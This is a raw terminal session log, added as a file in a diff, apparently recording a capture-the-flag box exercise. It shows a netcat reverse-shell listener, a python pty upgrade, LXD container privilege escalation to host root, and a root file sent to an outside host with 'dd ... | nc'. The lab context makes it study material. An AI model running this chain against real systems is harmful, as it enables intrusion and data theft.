@@ -1,0 +1,135 @@
+Script started on 2025-04-08 19:49:04+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 9800
+SOCKET: Shell has connected! PID: 2539
+[K[K[?2004hpoy[K[Kython3 -c 'import pty;pty,spawn("/bin/bash"0[K)[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty,spawn("/bin/bash")'
+[KTraceback (most recent call last):
+  File "<string>", line 1, in <module>
+NameError: name 'spawn' is not defined
+[K[K[?2004h[7mpython3 -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ubuntu:/opt/joomla/templates/protostar$ [Kwww-data@ubuntu:/opt/joomla/templates/protostar$ [K[?2004hwww-data@ubuntu:/opt/joomla/templates/protostar$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kalpine-v3.13-x86_64-20210218_0139.tar.gz  rlwrap
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ lxc image ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hlxc image ls
+[Klxc image ls
+[K+------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+|   ALIAS    | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
++------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+| root.image | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Apr 8, 2025 at 4:36pm (UTC) |
++------------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+[Kwww-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ lxc sr[Ktart ignite[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hlxc start ignite
+[Klxc start ignite
+[KError: Common start logic: The container is already running
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ [7mscript /dev/null[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hscript /dev/null
+[Kscript /dev/null
+[KScript started, file is /dev/null
+$ [K$ [K[?2004h$ [7mlxc exec ignite -- /bin/sh[27m[C[C[?2004l[C[C[K[?2004hlxc exec ignite -- /bin/sh
+[Klxc exec ignite -- /bin/sh
+[K~ # [6n[K[?2004h~ # [6n;5R;5R[K[K[K[K[K[Kid[?2004l[C[C[C[C[C[K[?2004hid
+[Kid
+[Kuid=0(root) gid=0(root)
+~ # [6n[K[?2004h~ # [6n;5R;5R[K[K[K[K[K[Kcd /mnt/root[?2004l[C[C[C[C[C[K[?2004hcd /mnt/root
+[Kcd /mnt/root
+[K/mnt/root # [6n[K[?2004h/mnt/root # [6n;13R;13R[K[K[K[K[K[K[K[Kls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K[1;34mbin[m             [1;34mlib[m             [1;34mroot[m            [1;34musr[m
+[1;34mboot[m            [1;34mlib64[m           [1;34mrun[m             [1;34mvar[m
+[1;34mdev[m             [1;34mlost+found[m      [1;34msbin[m            [1;36mvmlinuz[m
+[1;34metc[m             [1;34mmedia[m           [1;34msrv[m             [1;36mvmlinuz.old[m
+[1;34mhome[m            [1;34mmnt[m             [0;0mswapfile[m
+[1;36minitrd.img[m      [1;34mopt[m             [1;34msys[m
+[1;36minitrd.img.old[m  [1;34mproc[m            [1;34mtmp[m
+/mnt/root # [6n[K[?2004h/mnt/root # [6n;13R;13R[K[K[K[K[K[K[K[Kcd root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd root
+[Kcd root
+[K/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18Rls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h;18R;18Rls
+[K;18R;18Rls
+[K/bin/sh: syntax error: unexpected ";"
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K/bin/sh: 1ls: not found
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[K[0;0mfinal.txt[m
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kcat final.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat final.txt
+[Kcat final.txt
+[K
+     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                         
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114								
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+	
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 40
+drwx------    5 root     root          4096 Oct 25  2019 [1;34m.[m
+drwxr-xr-x   22 root     root          4096 Oct 22  2019 [1;34m..[m
+-rw-------    1 root     root            40 Oct 25  2019 [0;0m.bash_history[m
+-rw-r--r--    1 root     root          3106 Apr  9  2018 [0;0m.bashrc[m
+drwx------    2 root     root          4096 Oct 22  2019 [1;34m.cache[m
+drwxr-x---    3 root     root          4096 Oct 24  2019 [1;34m.config[m
+drwxr-xr-x    3 root     root          4096 Oct  8  2019 [1;34m.local[m
+-rw-------    1 root     root            33 Oct 24  2019 [0;0m.mysql_history[m
+-rw-r--r--    1 root     root           148 Aug 17  2015 [0;0m.profile[m
+-rw-r--r--    1 root     root          1003 Oct  8  2019 [0;0mfinal.txt[m
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kwhich dd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich dd
+[Kwhich dd
+[K/bin/dd
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kddi [K[Ki[K if=final.txt status =[K[K= [Kprogress |[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kwhih [K[K[K[K[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[K/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kwhich nc[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich nc
+[Kwhich nc
+[K/usr/bin/nc
+/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kdd if [K=final.tx [Kt progfre[K[K[K[Kres[K[K[Kgress=sta[K[K[K[K[K[K[K[K[K[K[K[Kstau[Ktus=progress | nc 10.8.61.245 4444[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=final.txt status=progress | nc 10.8.61.245 4444
+[Kdd if=final.txt status=progress | nc 10.8.61.245 4444
+[Kdd: invalid argument 'progress' to 'status'
+[K/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kdd if=final.txt | nc 10.8.61.245 4444[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=final.txt | nc 10.8.61.245 4444
+[Kdd if=final.txt | nc 10.8.61.245 4444
+[K1+1 records in
+1+1 records out
+[K/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[K[K[K[K[K[K[Kdd if=final.txt | nc 10.8.61.245 4444[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=final.txt | nc 10.8.61.245 4444
+[Kdd if=final.txt | nc 10.8.61.245 4444
+[K1+1 records in
+1+1 records out
+[K/mnt/root/root # [6n[K[?2004h/mnt/root/root # [6n;18R;18R[K[Kexit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K$ [K$ [K[?2004h$ exit[C[Cdd if=final.txt | nc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[16@status=progress [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwhich nc[Kdd[C[C[2Pls -al[C[Ccat final.txt[C[Cls[K;18R;18Rls[C[C[3Pcd root[C[Cls[Kcd /mnt/root[C[Cid[Klxc exec ignite -- /bin/sh[C[C[?2004l[C[C[K[?2004hlxc exec ignite -- /bin/sh
+[Klxc exec ignite -- /bin/sh
+[K~ # [6n[K[?2004h~ # [6n;5R;5R[K[K[K[K[K[Kcd /mnt/root[?2004l[C[C[C[C[C[K[?2004hcd /mnt/root
+[Kcd /mnt/root
+[K/mnt/root # [6n[K[?2004h/mnt/root # [6n;13R;13R[K[K[K[K[K[K[K[Kcd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root
+[K~ # [6n[K[?2004h~ # [6n;5R;5R[K[K[K[K[K[Kls -al[?2004l[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 12
+drwx------    2 root     root          4096 Apr  8 16:38 [1;34m.[m
+drwxr-xr-x   19 root     root          4096 Apr  8 16:38 [1;34m..[m
+-rw-------    1 root     root           331 Apr  8 16:55 [0;0m.ash_history[m
+~ # [6n[K[?2004h~ # [6n;5R;5R[K[K[K[K[K[Kexit[?2004l[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K$ [K$ [K[?2004h$ exit[C[C[?2004l[C[C[K[?2004hexit
+[Kexit
+[KScript done, file is /dev/null
+www-data@ubuntu:/tmp$ [Kwww-data@ubuntu:/tmp$ [K[?2004hwww-data@ubuntu:/tmp$ exitr[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexitr
+[Kexitr
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kexit
+[Kexitr: command not found
+[K[K[?2004he[K[?2004lwww-data@ubuntu:/tmp$ exit
+exit
+[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-08 19:55:35+03:00 [COMMAND_EXIT_CODE="0"]
